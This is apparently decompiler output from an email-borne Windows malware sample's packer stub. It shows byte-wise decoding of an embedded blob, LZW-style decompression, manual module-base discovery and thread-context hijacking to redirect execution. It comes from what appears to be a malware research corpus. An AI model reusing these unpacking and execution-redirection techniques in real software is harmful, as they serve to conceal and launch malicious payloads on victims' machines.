// subject.c
// Generated on 5/4/2015 12:46:19 AM by decompiling malware_via_email/malware_0183/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401030(Eq_7 * fs)
{
	globals->ptr4023C0 = &globals->t400000;
	fn004013DA(fs);
	fn0040136C();
	fn00401164();
	fn00401449();
	return;
}

void fn00401084(Eq_57 * dwArg04, word32 dwArg08, Eq_103 dwArg0C)
{
	Eq_19 * edi_13 = dwArg04;
	Eq_21 * esi_15 = dwArg08;
	word32 ecx_17 = dwArg0C;
	while (ecx_17 != 0x00000000)
	{
		edi_13->b0000 = esi_15->b0000;
		esi_15 = esi_15 + 1;
		edi_13 = edi_13 + 1;
		ecx_17 = ecx_17 - 0x00000001;
	}
	return;
}

word32 fn0040109A()
{
	word32 dwLoc10_15 = globals->dw4023C4;
	word64 edx_eax_17 = SEQ(0x00000000, dwLoc10_15);
	int32 dwLoc10_31 = globals->dw4023E0;
	uint32 edx_23 = edx_eax_17 % 0x00000020;
	byte dl_25 = (byte) (edx_eax_17 % 0x00000020);
	Eq_55 * ebx_28 = Mem0[0x004023C8:word32] + (SEQ(edx_eax_17 % 0x00000020, dwLoc10_15) /u 0x00000020 << 0x00000002);
	int32 edi_32 = dwLoc10_31;
	word32 eax_36 = 0x00000000;
	do
	{
		edi_32 = edi_32 - 0x00000001;
		uint32 esi_50 = __bswap(ebx_28->dw0000) << dl_25;
		if (esi_50 >>u 0x0000001F != 0x00000000)
			eax_36 = eax_36 + ((esi_50 >>u 0x0000001F) << (byte) edi_32);
		edx_23 = edx_23 + 0x00000001;
		dl_25 = (byte) edx_23;
		if (edx_23 == 0x00000020)
		{
			ebx_28 = ebx_28 + 1;
			edx_23 = 0x00000000;
			dl_25 = 0x00;
		}
	} while (edi_32 != 0x00000000);
	globals->dw4023C4 = globals->dw4023C4 + dwLoc10_31;
	return eax_36;
}

void fn00401164()
{
	Eq_2 * eax_13 = globals->ptr4023C0;
	Eq_103 ecx_16 = eax_13->t4074;
	globals->t4023D0 = ecx_16;
	globals->dw4023D4 = ecx_16 << 0x00000003;
	Eq_113 eax_27 = HeapCreate(0x00000001, 0x00000000, 0x00000000);
	globals->t4023F0 = eax_27;
	Eq_57 * eax_36 = HeapAlloc(eax_27, 0x00000008, globals->t4023D0);
	globals->ptr4023C8 = eax_36;
	Mem41[0x004023CC:word32] = eax_36 + Mem38[0x004023D0:word32];
	fn00401084(globals->ptr4023C8, &eax_13->t4074, globals->t4023D0);
	Eq_57 * edi_49 = globals->ptr4023C8;
	Eq_103 ecx_50 = globals->t4023D0;
	do
	{
		edi_49->b0000 = edi_49->b0000 - 0x33;
		edi_49 = edi_49 + 1;
		ecx_50 = ecx_50 - 0x00000001;
	} while (ecx_50 != 0x00000000);
	Mem61[0x004023C8:word32] = Mem54[0x004023C8:word32] + 0x00000001;
	return;
}

void fn00401284()
{
	word32 ebx_15 = Mem0[0x004023D8:word32] + 0x00000001;
	byte cl_13 = 0x00;
	uint32 ecx_12 = 0x00000100;
	do
	{
		ebx_15->b0000 = 0x01;
		ebx_15->b0000 = cl_13;
		cl_13 = cl_13 + 0x01;
		ebx_15 = ebx_15 + 1;
		ecx_12 = DPB(ecx_12, cl_13, 0, 8);
	} while (cl_13 != 0x00);
	globals->dw4023DC = ecx_12;
	return;
}

void fn004012A7()
{
	word32 ecx_14 = (word32) globals->a4022CC;
	Eq_208 * ebx_11 = Mem0[0x004023D8:word32] + (word32) (globals->dw4023DC *u 0x000000A0);
	ebx_11->b0000 = (byte) ecx_14;
	Eq_221 * esi_16 = &globals->a4022CD;
	Eq_223 * edi_20 = &ebx_11->t0001;
	while (ecx_14 != 0x00000000)
	{
		edi_20->b0000 = esi_16->b0000;
		esi_16 = esi_16 + 1;
		edi_20 = edi_20 + 1;
		ecx_14 = ecx_14 - 0x00000001;
	}
	globals->dw4023DC = globals->dw4023DC + 0x00000001;
	fn004012D9();
	return;
}

void fn004012D9()
{
	if (globals->dw4023DC == 0x00000200)
	{
		globals->dw4023DC = 0x00000100;
		globals->dw4023E0 = 0x00000009;
	}
	return;
}

void fn004012FC()
{
	globals->b402414 = globals->a4022CD;
	return;
}

void fn0040130A(int32 dwArg04)
{
	Eq_262 * ebx_36 = Mem0[0x004023D8:word32] + (word32) (dwArg04 *u 0x000000A0);
	Eq_270 * edi_28 = &globals->a4022CC;
	word32 ecx_39 = (word32) ebx_36->b0000 + 0x00000001;
	Eq_262 * esi_41 = ebx_36;
	while (ecx_39 != 0x00000000)
	{
		edi_28->b0000 = esi_41->b0000;
		esi_41 = esi_41 + 1;
		edi_28 = edi_28 + 1;
		ecx_39 = ecx_39 - 0x00000001;
	}
	return;
}

void fn00401332()
{
	globals->a4022CC = globals->a4022CC + 0x01;
	((word32) globals->a4022CC)->b4022CC = globals->b402414;
	return;
}

void fn00401348()
{
	word32 ecx_32 = (word32) globals->a4022CC;
	Eq_312 * edi_30 = Mem0[0x004023E8:word32] + Mem0[0x004023EC:word32];
	globals->dw4023EC = globals->dw4023EC + ecx_32;
	Eq_322 * esi_36 = &globals->a4022CD;
	while (ecx_32 != 0x00000000)
	{
		edi_30->b0000 = esi_36->b0000;
		esi_36 = esi_36 + 1;
		edi_30 = edi_30 + 1;
		ecx_32 = ecx_32 - 0x00000001;
	}
	return;
}

void fn0040136C()
{
	Eq_338 eax_14 = CreateThread(0x00000000, 0x00000000, 0x004013D9, 0x00000000, 0x00000004, 0x00000000);
	globals->t4023FC = eax_14;
	Mem16[0x0040240C:word32]();
	globals->t4023F8 = eax_14;
	globals->dw402000 = 0x00010002;
	GetThreadContext(globals->t4023FC, 0x00402000);
	globals->dw4020B0 = 0x0040104C;
	SetThreadContext(globals->t4023FC, &globals->dw402000);
	ResumeThread(globals->t4023FC);
	SuspendThread(globals->t4023F8);
	return;
}

void fn004013DA(Eq_7 * fs)
{
	Eq_394 eax_10 = fs->ptr0000->dw0004 & 0xFFFF0000;
	do
		eax_10 = eax_10 - 0x00010000;
	while (Mem0[eax_10 + 0x00000000:word16] != 0x5A4D);
	globals->t402404 = eax_10;
	globals->ptr402408 = GetProcAddress(eax_10, 0x00401408);
	fp->dwFFFFFFF8 = 0x00401415;
	globals->ptr40240C = GetProcAddress(globals->t402404, 0x00401408);
	return;
}

void fn00401449()
{
	Eq_113 eax_20 = HeapCreate(0x00000001, 0x00000000, 0x00000000);
	globals->t4023F4 = eax_20;
	globals->ptr4023E8 = HeapAlloc(eax_20, 0x00000008, 0x0000EA60);
	Eq_113 eax_38 = HeapCreate(0x00000001, 0x00000000, 0x00000000);
	globals->t402400 = eax_38;
	globals->ptr4023D8 = HeapAlloc(eax_38, 0x00000008, 0x00C35000);
	fn00401284();
	globals->dw4023E0 = 0x00000009;
	int32 eax_54 = fn0040109A();
	fn0040130A(eax_54);
	fn00401348();
	fn004012FC();
	int32 dwLoc0C_55 = eax_54;
	while (globals->dw4023D4 - globals->dw4023C4 >= globals->dw4023E0)
	{
		int32 eax_71 = fn0040109A();
		if (eax_71 > globals->dw4023DC - 0x00000001)
		{
			fn0040130A(dwLoc0C_55);
			fn00401332();
		}
		else
			fn0040130A(eax_71);
		fn00401348();
		fn004012FC();
		fn0040130A(dwLoc0C_55);
		fn00401332();
		fn004012A7();
		dwLoc0C_55 = eax_71;
	}
	return;
}

